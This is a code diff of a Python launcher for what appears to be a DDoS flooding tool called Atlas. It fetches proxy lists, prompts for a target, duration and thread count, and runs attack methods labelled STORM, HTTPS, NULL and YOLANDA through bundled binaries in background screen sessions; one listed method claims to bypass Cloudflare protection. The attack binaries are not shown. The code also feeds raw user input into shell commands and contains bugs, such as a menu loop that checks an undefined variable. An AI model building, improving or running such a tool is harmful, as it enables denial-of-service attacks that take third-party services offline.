@@ -4,51 +4,71 @@ import os
 import sys
 import time
 from subprocess import run
-from colorama import Fore, Back, Style
 from time import sleep
-from rich.console import Console
+from shutil import which
+
+require_module = ['colorama', 'rich', 'httpx']
 
 try:
-    import colorama, rich
-except:
-    if sys.platform.startswith("linux"):
-        os.system("pip3 install colorama && pip3 install rich && pip install unzip")
-    elif sys.platform.startswith("freebsd"):
-        os.system("pip3 install colorama && pip3 install rich && pip install unzip")
-        
-os.system("unzip methods.zip")
-os.system("unzip ATLAS-METHODS.zip")
-os.system("mv ATLAS-METHODS methods")
-os.system("cd methods && chmod +x *")
-os.system("rm -rf methods.zip ATLAS-METHODS.zip")
+	requests = __import__("httpx") # httpx is faster than requests
+	from colorama import Fore, Back, Style
+	from rich.console import Console
+except Exception:
+	exit("[X] Error? try this pip3 install requirements.txt")
+
+try:
+	for zipfile in ["methods.zip", "ATLAS-METHODS.zip"]:
+		os.remove(zipfile)
+except FileNotFoundError:
+	pass
 
 console = Console()
 tasks = [f"task {n}" for n in range(1, 3)]
-
 with console.status("[bold green]Finding missing on files...") as status:
-    while tasks:
-        task = tasks.pop(0)
-        sleep(1)
-        console.log(f"{task} complete")
-        try:
-            file = open('key.txt')
-            file1 = open('proxy.txt')
-            file2 = open('requirements.txt')
-            print("[X] All files Scanned Completed!")
-            file.close()
-            file1.close()
-            file2.close()
-        except IOError:
-            print("[X] Some files does not exist, Please install again!")
-            sys.exit(0)
+	while tasks:
+		task = tasks.pop(0)
+		sleep(1)
+		console.log(f"{task} complete")
+		try:
+			with open("key.txt"):
+				open("requirements.txt")
+				open("install.sh")
+				print("[X] All files Scanned Completed!")
+		except IOError:
+			exit("[X] Some files does not exist, Please install again!")
+
+
+def getproxy() -> None:
+#	print("[+] Checking Proxy Providers...")
+	print("[+] Please wait...")
+	with open("proxy_providers.txt", mode="r") as readurl:
+#		print("[+] Downloading Proxies...")
+		for url in readurl:
+			url = url.strip()
+			with open("proxy.txt", mode="a") as file:
+				try:
+					file.write(requests.get(url, timeout=1000).text)
+					print("[+] Attack Sent Successfully!!")
+					print("Type 'STOP' to stop your Attack.")
+				except requests.ConnectError:
+					exit("[X] Connection Error")
+				except KeyboardInterrupt:
+					exit()
+
+
+def OSclear():
+	os.system('clear' if os.name == 'posix' else 'cls')
+
+
 def unavail():
-    print("""
+	print("""
 ╔════════════════════════════════════════════════════════════════════════╗
 ║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
 ╚════════════════════════════════════════════════════════════════════════╝
     """)
+ 
 def tos():
-    print("""\033[1;31;40m
+	print("""\033[1;31;40m
 ╔════════════════════════════════════════════════════════════════════════╗
 ║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
 ╠════════════════════════════════════════════════════════════════════════╣
@@ -61,39 +81,52 @@ def tos():
 ╚════════════════════════════════════════════════════════════════════════╝
 
     """)
-    accept = input("Do you agree in our TOS [Y/N]: ")
-    if (accept == "Y") or (accept == "y"):
-        time.sleep(2)
-        print("[X] Proceeding...")
-        menu()
-    if (accept == "N") or (accept == "n") or (accept == "no") or (accept == "No"):
-        sys.exit(0)
+	while 1:
+		accept = input("Do you agree in our TOS [Y/N]: ")
+		if accept in ["y", "Y", "yes", "YES"]:
+			sleep(2)
+			print("[X] Proceeding...")
+			menu()
+		elif accept in ["n", "N", "no", "NO"]:
+			sleep(2)
+			exit("GOODBYE")
+		elif accept in "":
+			pass
+		else:
+			OSclear()
+			tos()
+
 
 def banner():
-    print("""\033[1;32;40m
+	print("""\033[1;32;40m
     \033[1;31;40m-- [ \033[2;30;42mCONNECTION ESTABLISHED\033[1;31;40m ] --\033[1;32;40m
         ╔═╗╔╦╗╦  ╔═╗╔═╗   ╔═╗╦ ╦
         ╠═╣ ║ ║  ╠═╣╚═╗───╠═╝╠═╣
         ╩ ╩ ╩ ╩═╝╩ ╩╚═╝   ╩  ╩ ╩\033[1;31;40m
-     -- \033[1;32;40mANONPRIXOR \033[1;31;40m & \033[1;32;40mMsYor \033[1;31;40m & \033[1;32;40mAYA \033[1;31;40m -- 
+     -- \033[1;32;40mANONPRIXOR \033[1;31;40m & \033[1;32;40mF34RL3SS \033[1;31;40m & \033[1;32;40mAYA \033[1;31;40m -- 
       Type dev to see who develop
     """)
+
 def repeater():
-    repeat = input("[Atlas Bot] Do you want to go back to menu? [Y/N]: ")
-    if (repeat == "Y") or (repeat == "y"):
-        time.sleep(2)
-        menu()
-    if (repeat == "N") or (repeat == "n"):
-        time.sleep(2)
-        print("GOODBYE!")
-        sys.exit(0)
-def OSclear():
-	os.system('clear' if os.name == 'posix' else 'cls')
+	while 1:
+		repeat = input("[Atlas Bot] Do you want to go back to menu? [Y/N]: ")
+		if accept in ["y", "Y", "yes", "YES"]:
+			sleep(2)
+			print("[X] Proceeding...")
+			menu()
+		elif accept in ["n", "N", "no", "NO"]:
+			exit()
+		elif accept in "":
+			pass
+		else:
+			OSclear()
+			menu()
+
 
 def menu():
-    OSclear()
-    banner()
-    print("""
+	OSclear()
+	banner()
+	print("""
 ╔════════════════════════════════════════════════════════════╗
 ║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
 ║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
@@ -101,15 +134,18 @@ def menu():
 ╚════════════════════════════════════════════════════════════╝
 
     """)
-    choose1 = input("atlas-api@free@#~> ")
-    if (choose1 == "1"):
-        userinfo()
-    if (choose1 == "2"):
-        launchflood()
-    if (choose1 == "3"):
-        fileupdate()
-    if (choose1 == "dev"):
-        developer()
+	while 1:
+		choose1 = input("atlas-api@free@#~> ")
+		if (choose1 == "1"):
+			userinfo()
+		elif (choose1 == "2"):
+			launchflood()
+		elif (choose1 == "3"):
+			fileupdate()
+		elif (choose1 == "dev"):
+			developer()
+		elif (choose1 == ""):
+			pass
 
 #UserINFO
 def userinfo():
@@ -126,8 +162,8 @@ def userinfo():
     repeater()
 
 def launchflood():
-    OSclear()
-    print("""
+	OSclear()
+	print("""
 ╔═════════════════╦═══════════════════════╦══════════════════════╦═════════════════════╗
 ║    \033[1;37;40mMETHODS      \033[1;31;40m║      \033[1;37;40mINFORMATION      \033[1;31;40m║      \033[1;37;40mPERMISSION      \033[1;31;40m║       \033[1;37;40mSTATUS        \033[1;31;40m║
 ╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
@@ -142,32 +178,54 @@ def launchflood():
 ║   \033[1;36;40mATLAS-UAM     \033[1;31;40m║ \033[1;36;40mBYPASS CLOUDFLARE UAM \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║     \033[1;31;47mUNAVAILABLE\033[1;31;40m     ║
 ╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
     """)
-    methods = input("[X] Choose Methods: ")
-    if (methods == "ATLAS-YOLANDA") or (methods == "atlas-yolanda"):
-        target = input("[X] Target: ")
-        time = input("[X] Time: ")
-        thread = input("[X] Threads [3]: ")
-        spoof = input("[X] Spoof List [proxy.txt]: ")
-        proxylist = input("[X] Proxy List [proxy.txt]: ")
-        run([f'./methods/ATLAS-METHODY {target} {time} {thread} {spoof} {proxylist}'], shell=True)
-    if (methods == "ATLAS-STORM") or (methods == "atlas-storm"):
-        target = input("[X] Target: ")
-        time = input("[X] Time: ")
-        thread = input("[X] Threads [5-10]: ")
-        run([f'./methods/ATLAS-METHODS {target} {time} storm {thread}'], shell=True)
-    if (methods == "ATLAS-HTTPS") or (methods == "atlas-https"):
-        target = input("[X] Target: ")
-        time = input("[X] Time: ")
-        thread = input("[X] Threads [5-10]: ")
-        run([f'./methods/ATLAS-METHODS {target} {time} proxy {thread}'], shell=True)
-    if (methods == "ATLAS-NULL") or (methods == "atlas-null"):
-        target = input("[X] Target: ")
-        time = input("[X] Time: ")
-        thread = input("[X] Threads [5-10]: ")
-        run([f'./methods/ATLAS-METHODS {target} {time} null-x {thread}'], shell=True)
-    if (methods == "ATLAS-UAM") or (methods == "atlas-uam"):
-        unavail()
-        repeater()
+	while 1:
+		methods = input("[X] Choose Methods: ")
+		if methods in ["ATLAS-YOLANDA", "atlas-yolanda"]:
+			try:
+				target = input("[X] Target: ")
+				time = int(input("[X] Time: "))
+				thread = int(input("[X] Threads [3]: "))
+				getproxy()
+				run([f'screen -dm ./methods/ATLAS-METHODY {target} {time} {thread} proxy.txt proxy.txt'], shell=True)
+			except:
+				print("Error try again")
+		elif methods in ["ATLAS-STORM", "atlas-storm"]:
+			try:
+				target = input("[X] Target: ")
+				time = int(input("[X] Time: "))
+				thread = int(input("[X] Threads [5-10]: "))
+				getproxy()
+				run([f'screen -dm ./methods/ATLAS-METHODS {target} {time} storm {thread}'], shell=True)
+			except:
+				print("Error try again")
+		elif methods in ["ATLAS-HTTPS", "atlas-https"]:
+			try:
+				target = input("[X] Target: ")
+				time = int(input("[X] Time: "))
+				thread = int(input("[X] Threads [5-10]: "))
+				getproxy()
+				run([f'screen -dm ./methods/ATLAS-METHODS {target} {time} proxy {thread}'], shell=True)
+			except:
+				print("Error try again")
+		elif  methods in ["ATLAS-NULL", "atlas-null"]:
+			try:
+				target = input("[X] Target: ")
+				time = int(input("[X] Time: "))
+				thread = int(input("[X] Threads [5-10]: "))
+				getproxy()
+				run([f'screen -dm ./methods/ATLAS-METHODS {target} {time} null-x {thread}'], shell=True)
+			except:
+				print("Error try again")
+		elif methods in ["ATLAS-UAM", "atlas-uam"]:
+			unavail()
+			repeater()
+		elif methods in "":
+			pass
+		elif methods in ["stop", "STOP"]:
+			run(["pkill screen"], shell=True)
+			print("[+] Attack Stopped!")
+		else:
+		   print("[X] Invalid Method")
     #if (methods == "ATLAS-UAM") or (methods == "atlas-uam"):
     #    target = input("[X] Target: ")
     #    time = input("[X] Time: ")
@@ -193,10 +251,28 @@ def developer():
     print("""
 ╔════════════════════════════════════════════════════════════╗
 ║     DEVELOPER: ANONPRIXOR                                  ║
-║     COMPILED SCRIPTS: AYA & MSYOR                          ║        
+║     COMPILED SCRIPTS: F34RL3SS & AYA                          ║        
 ╚════════════════════════════════════════════════════════════╝
 
     """)
     repeater()
 
-tos()
+def main():
+	print("[+] Checking Dependencies...\n")
+	pkgs = ['screen']
+	install = True
+	for pkg in pkgs:
+		ok = which(pkg)
+		if ok == None:
+			print(f"[X] {pkg} is not installed!\n")
+			install = False
+		else:
+			pass
+	if install == False:
+		exit(f'[?] Error? try: sh install.sh')
+	else:
+		OSclear()
+		tos()
+
+if __name__ == "__main__":
+	main()
